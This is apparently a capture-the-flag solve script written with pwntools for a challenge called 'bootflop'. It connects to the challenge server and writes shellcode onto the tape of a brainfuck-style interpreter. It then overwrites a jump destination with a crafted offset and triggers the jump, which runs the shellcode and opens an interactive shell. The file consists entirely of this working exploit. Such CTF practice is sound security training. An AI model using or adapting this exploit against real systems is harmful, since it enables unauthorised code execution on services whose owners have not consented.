from pwn import *

# p = process("./run.sh")
p = remote("bootflop.ctf.ingeniums.club", 1337, ssl=True)
assert p

sc = open("../solve/sc", "rb").read()

# write shellcode to tape
for c in sc:
    p.sendline(b",>")
    p.send(p8(c))

# overwrite jump destination so it jumps to shellcode
p.sendline(b"<" * 0x35 + b",")
p.send(p8(0x1A))

# trigger the jump
p.sendline(b"]")

p.interactive()
